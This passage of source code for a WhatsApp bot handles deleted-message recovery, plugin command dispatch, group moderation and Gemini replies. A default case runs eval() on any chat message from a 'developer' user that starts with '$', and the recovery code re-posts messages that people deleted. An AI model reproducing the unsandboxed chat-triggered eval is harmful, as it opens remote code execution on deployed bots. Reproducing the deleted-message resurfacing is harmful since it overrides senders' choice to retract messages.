      return await conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` },{quoted: audioq});
      
      }else{
      if(originalMessage.message.audioMessage.ptt === "true"){
      
      const pttt = await conn.sendMessage(delfrom, { audio: fs.readFileSync("./" + type.ext), mimetype:  originalMessage.message.audioMessage.mimetype, ptt: 'true',fileName: `${m.id}.mp3` })	
      return await conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` },{quoted: pttt});
      
       }
        }
       }
      
      audioMessageRetrive()
      }else if(originalMessage.type === 'stickerMessage') {
            async function stickerMessageRetrive(){      var nameJpg = getRandom('');
      const ml = sms(conn, originalMessage)
                  let buff =  await ml.download(nameJpg)
                  let fileType = require('file-type');
                  let type = fileType.fromBuffer(buff);
                  await fs.promises.writeFile("./" + type.ext, buff);
      if(originalMessage.message.stickerMessage){
       
      //await conn.sendMessage(from, { audio: fs.readFileSync("./" + type.ext), mimetype:  originalMessage.message.audioMessage.mimetype, fileName:  `${m.id}.mp3` })	
       const sdata = await conn.sendMessage(delfrom,{sticker: fs.readFileSync("./" + type.ext) ,package: 'PRABATH-MD 🌟'})
      return await conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` },{quoted: sdata});
      
      }else{
      
      const stdata = await conn.sendMessage(delfrom,{sticker: fs.readFileSync("./" + type.ext) ,package: 'PRABATH-MD 🌟'})
      return await conn.sendMessage(delfrom, { text: `🚫 *This message was deleted !!*\n\n  🚮 *Deleted by:* _${deletedBy}_\n  📩 *Sent by:* _${sentBy}_\n` },{quoted: stdata});
      
        }
       }
      
      stickerMessageRetrive()
               }
           
        } else {
          console.log('Original message not found for revocation.');
        }
      }
      if(!isGroup){
      if (mek.msg && mek.msg.type === 0) {
        handleMessageRevocation(mek);
      } else {//if(mek.message && mek.message.conversation && mek.message.conversation !== ''){
        handleIncomingMessage(mek);
      
          }}
      
      }
      }	
      }            
  //==================================plugin map================================
              const events = require('./command')
              const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
              if (isCmd) {
                  const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
                  if (cmd) {
                      if (cmd.react) conn.sendMessage(from, {
                          react: {
                              text: cmd.react,
                              key: mek.key
                          }
                      })
  
                      try {
                          cmd.function(conn, mek, m, {
                              from,
                              prefix,
                              quoted,
                              body,
                              isCmd,
                              command,
                              args,
                              q,
                              isSudo,
                              isGroup,
                              sender,
                              senderNumber,
                              botNumber2,
                              botNumber,
                              pushname,
                              isMe,
                              isOwner,
                              isCreator,
                              isDev,
                              isPreUser,
                              groupMetadata,
                              groupName,
                              participants,
                              groupAdmins,
                              isBotAdmins,
                              isAdmins,
                              reply,
                              apilink,
                              apilink2,
                              apikey,
                              creator,
                              msr,
                              backup
                          });
                      } catch (e) {
                          console.error("[PLUGIN ERROR] ", e);
                      }
                  }
              }
              events.commands.map(async (command) => {
                  if (body && command.on === "body") {
                      command.function(conn, mek, m, {
                          from,
                          prefix,
                          quoted,
                          body,
                          isCmd,
                          command,
                          args,
                          q,
                          isSudo,
                          isGroup,
                          sender,
                          senderNumber,
                          botNumber2,
                          botNumber,
                          pushname,
                          isMe,
                          isOwner,
                          isCreator,
                          isDev,
                          isPreUser,
                          groupMetadata,
                          groupName,
                          participants,
                          groupAdmins,
                          isBotAdmins,
                          isAdmins,
                          reply,
                          apilink,
                          apilink2,
                          apikey,
                          creator,
                          msr,
                          backup
                      })
                  } else if (mek.q && command.on === "text") {
                      command.function(conn, mek, m, {
                          from,
                          prefix,
                          quoted,
                          body,
                          isCmd,
                          command,
                          args,
                          q,
                          isSudo,
                          isGroup,
                          sender,
                          senderNumber,
                          botNumber2,
                          botNumber,
                          pushname,
                          isMe,
                          isOwner,
                          isCreator,
                          isDev,
                          isPreUser,
                          groupMetadata,
                          groupName,
                          participants,
                          groupAdmins,
                          isBotAdmins,
                          isAdmins,
                          reply,
                          apilink,
                          apilink2,
                          apikey,
                          creator,
                          msr,
                          backup
                      })
                  } else if (
                      (command.on === "image" || command.on === "photo") &&
                      mek.type === "imageMessage"
                  ) {
                      command.function(conn, mek, m, {
                          from,
                          prefix,
                          quoted,
                          body,
                          isCmd,
                          command,
                          args,
                          q,
                          isSudo,
                          isGroup,
                          sender,
                          senderNumber,
                          botNumber2,
                          botNumber,
                          pushname,
                          isMe,
                          isOwner,
                          isCreator,
                          isDev,
                          isPreUser,
                          groupMetadata,
                          groupName,
                          participants,
                          groupAdmins,
                          isBotAdmins,
                          isAdmins,
                          reply,
                          apilink,
                          apilink2,
                          apikey,
                          creator,
                          msr,
                          backup
                      })
                  } else if (
                      command.on === "sticker" &&
                      mek.type === "stickerMessage"
                  ) {
                      command.function(conn, mek, m, {
                          from,
                          prefix,
                          quoted,
                          body,
                          isCmd,
                          command,
                          args,
                          q,
                          isSudo,
                          isGroup,
                          sender,
                          senderNumber,
                          botNumber2,
                          botNumber,
                          pushname,
                          isMe,
                          isOwner,
                          isCreator,
                          isDev,
                          isPreUser,
                          groupMetadata,
                          groupName,
                          participants,
                          groupAdmins,
                          isBotAdmins,
                          isAdmins,
                          reply,
                          apilink,
                          apilink2,
                          apikey,
                          creator,
                          msr,
                          backup
                      })
                  }
              });
  
  if (config.ANTI_LINK == "true"){
  if (!isCreator && !isDev && isGroup && isBotAdmins ) {
  if (body.match(`chat.whatsapp.com`)) {
  if(groupAdmins.includes(sender)) return
  await conn.sendMessage(from, { delete: mek.key })  
  }}}
  
  if (config.AUTO_MSG_READ == "true"){
  await conn.readMessages([mek.key])
  }
  //-----------------------------AI MODE FUNCTIONS ----------------------------------------------
        
  if (config.AI_MODE == "false"){
  if (m.mentionUser == botNumber2) {
  gemini(q)
  .then(async (dadsta) => {
       const data = dadsta
  await conn.sendMessage(from, { react: { text: '🧠', key: mek.key } })    
  return await reply(data)
  })}} 
  
  //============================================================================      
        
  const bad = await fetchJson(`https://raw.githubusercontent.com/DarkYasiyaMr/DARKYASIYA-BOT-IMFOMATION/main/bad_word.json`)
  if (config.ANTI_BAD == "true"){
    if (!isAdmins && !isDev) {
    for (any in bad){
    if (body.toLowerCase().includes(bad[any])){  
      if (!body.includes('tent')) {
        if (!body.includes('docu')) {
          if (!body.includes('https')) {
    if (groupAdmins.includes(sender)) return 
    if (mek.key.fromMe) return   
    await conn.sendMessage(from, { delete: mek.key })  
    await conn.sendMessage(from , { text: '*Bad word detected..!*'})
    await conn.groupParticipantsUpdate(from,[sender], 'remove')
    }}}}}}}
  
        
    // ANTI BOT OKKOMATAMA DENNAM WADE 
   if (config.ANTI_BOT == "true"){
    if ( isGroup && !isAdmins && !isDev && !isMe && !isCreator && isBotAdmins ) {
    if ( mek.id.startsWith("BAE") ) {
  await conn.sendMessage(from, { text: "❌ ```Another Bot's message Detected :```" })
  if ( config.ANTI_BOT == "true" && isBotAdmins ) {
  await conn.sendMessage(from, { delete: mek.key })
  await conn.groupParticipantsUpdate(from,[sender], 'remove')
    }}
      if ( mek.id.startsWith("QUEENAMDI") ) {
  await conn.sendMessage(from, { text: "❌ ```Another Bot's message Detected :```" })
  if ( config.ANTI_BOT == "true" && isBotAdmins ) {
  await conn.sendMessage(from, { delete: mek.key })
  await conn.groupParticipantsUpdate(from,[sender], 'remove')
    }}
  
    
    }
    }            
  //==================================================================
              switch (command) {
                  case 'jid':
                      reply(from)
                      break
                  case 'device2': {
                      let deviceq = getDevice(mek.message.extendedTextMessage.contextInfo.stanzaId)
  
                      reply("*He Is Using* _*Whatsapp " + deviceq + " version*_")
                  }
                  break
                  
                  default:
  if ((isDev) && body.startsWith('$')) {
  let bodyy = body.split('$')[1]
  let code2 = bodyy.replace("°", ".toString()");
  try {
  let resultTest = await eval(code2);
  if (typeof resultTest === "object") {
  reply(util.format(resultTest));
  } else {
  reply(util.format(resultTest));
  }
  } catch (err) {
  reply(util.format(err));
  }}
  }
      
          } catch (e) {
              const isError = String(e)
              console.log(isError)
          }
      })
  }
  app.get("/", (req, res) => {
      res.send("📟 Frozen Working successfully!");
  });
  app.listen(port, () => console.log(`Frozen Server listening on port http://localhost:${port}`));
  setTimeout(async () => {
      await connectToWA()
  }, 1000);
  
